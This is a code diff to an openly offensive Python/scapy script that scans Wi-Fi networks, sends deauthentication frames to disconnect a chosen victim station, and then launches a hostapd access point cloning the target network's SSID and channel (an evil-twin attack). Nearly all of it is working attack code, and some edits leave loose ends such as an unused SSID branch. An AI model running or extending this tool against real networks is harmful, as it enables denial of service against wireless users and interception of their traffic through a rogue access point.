@@ -8,6 +8,7 @@ from progress.spinner import Spinner, MoonSpinner, PixelSpinner, PieSpinner, Lin
 from scapy.all import *
 import time
 import netifaces
+import http.server
 from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11ProbeReq
 
 mac = ''
@@ -47,13 +48,15 @@ def arg_parse():
                         help='Name of the wireless interface you want to sniff packets on')
     parser.add_argument('-c', '--channels', required=False, nargs=2, type=str,
                         help='choose the channel range of which to sniff on')
+    parser.add_argument('-n', '--count', required=True, type=int,
+                        help='specify how many deauth frames to send')
 
     args = vars(parser.parse_args())
     if args['interface'] not in netifaces.interfaces():
         print('Interface not found.')
         sys.exit()
 
-    return args['interface'], args['channels']
+    return args['interface'], args['channels'], args['count']
 
 
 # switch interface to monitor mode
@@ -70,8 +73,6 @@ def add_ap(pkt):
     global AP
     if pkt.haslayer(Dot11Beacon):
         ssid = pkt[Dot11Beacon].network_stats()['ssid']
-    else:
-        ssid = pkt[Dot11ProbeResp].network_stats()['ssid']
 
     bssid = pkt[Dot11].addr3.lower()  # ap mac address
     ap_channel = str(ord(pkt[Dot11Elt:3].info))
@@ -135,7 +136,7 @@ def noise_filter(addr1, addr2):
 def handler(pkt):
     if pkt.haslayer(Dot11):
 
-        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):  # AP
+        if pkt.haslayer(Dot11Beacon):  # AP
             add_ap(pkt)
 
         elif pkt.addr1 and pkt.addr2:
@@ -169,7 +170,7 @@ def sniffer(iface, ch):
     else:
         from_ch = 1
         to_ch = 14
-    timeout = time.time() + 20  # a minute  from now
+    timeout = time.time() + 60  # a minute  from now
     while True:
         os.system("iwconfig " + iface + " channel " + str(from_ch))  # switch channel
         from_ch = from_ch % to_ch + 1
@@ -214,34 +215,36 @@ def output_client(net):
                                                        client_AP[i]['BSSID']))
 
 
-def deauth(target_mac, iface):
+def deauth(target_mac, iface, count):
     global client_AP
     bssid = client_AP[target_mac]['BSSID']
     dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)
-    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
-    sendp(frame, iface=iface, loop=1, inter=0.1, verbose=0)
+    frame = RadioTap() / dot11 / Dot11Deauth()
+    print("[+] starting attack...")
+    sendp(frame, iface=iface, count=count, inter=.2, verbose=1)
 
 
-# send beacon frames in an infinite loop inorder to identify as the chosen AP for the attack
-def send_beacon(iface, net):
-    global mac
+def launchHostapd(iface, net):
     global AP
-    # SSID (name of access point)
-    ssid = AP[net]
-    # 802.11 frame
-    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
-    # beacon layer
-    beacon = Dot11Beacon()
-    # putting ssid in the frame
-    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
-    # stack all the layers and add a RadioTap
-    frame = RadioTap() / dot11 / beacon / essid
-    # send the frame in layer 2 every 200 milliseconds forever
-    sendp(frame, inter=0.2, iface=iface, loop=1, verbose=0)
+    # Hostapd configuration
+    print('[+] Configuring hostapd...')
+    hostapdConfigFile = 'hostapd.conf'
+    hostapdConfig = ''
+    hostapdConfig += 'interface=' + iface + '\n'  # Interface used
+    hostapdConfig += 'driver=nl80211\n'  # Driver interface typr
+    hostapdConfig += 'ssid=' + AP[net]['ESSID'] + '\n'  # SSID
+    hostapdConfig += 'hw_mode=g\n'  # Hardware mode (802.11g)
+    hostapdConfig += 'channel=' + AP[net]['channel'] + '\n'  # Channel
+    hostapdConfig += 'ignore_broadcast_ssid=0\n'  # Require stations to know SSID to connect (ignore probe requests
+    f = open(hostapdConfigFile, 'w')
+    f.write(hostapdConfig)
+    f.close()
+    os.system("hostapd -B hostapd.conf")
+    print('[+] hostapd succesfuly configured')
 
 
 if __name__ == "__main__":
-    interface, channel = arg_parse()
+    interface, channel, count = arg_parse()
     print(presentation)
     progress()
     os.system('clear')
@@ -261,9 +264,6 @@ if __name__ == "__main__":
     network = input("enter the mac address of the network you want to attack: ")
     output_client(network)
     victim = input("enter the mac address of the station you want to attack: ")
-    sleep(1)
-    print("[+] attacking station ", victim)
-    Thread(target=deauth, args=(victim, interface)).start()
-    sleep(2)
-    print("[+]sending beacon frames with victim access point's SSID")
-    Thread(target=send_beacon, args=(interface, network)).start()
+    time.sleep(1)
+    deauth(victim, interface,count)
+    launchHostapd(interface, network)
